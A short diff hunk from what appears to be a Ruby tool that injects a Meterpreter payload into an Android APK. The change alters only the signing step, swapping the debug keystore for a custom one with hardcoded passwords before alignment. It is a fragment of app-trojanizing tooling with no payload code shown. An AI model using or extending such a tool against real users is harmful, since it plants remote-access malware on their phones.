@@ -255,7 +255,7 @@ print "[*]─➤ Rebuilding #{apkfile} with meterpreter injection as #{injected_
 
 if File.exist?("#{injected_apk}")
   print "[*]─➤ Signing #{injected_apk} ..\n".cyan
-  `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/#{injected_apk} androiddebugkey`
+  `jarsigner -verbose -keystore $(pwd)/my.keystore -storepass EMBED2 -keypass embed2 -digestalg SHA1 -sigalg SHA256withRSA $(pwd)/#{injected_apk} app`
   print "[*]─➤ Aligning #{injected_apk} ..\n".cyan
   `zipalign -f -v 4 $(pwd)/#{injected_apk} #{final_apk}`
   cleaning_up()
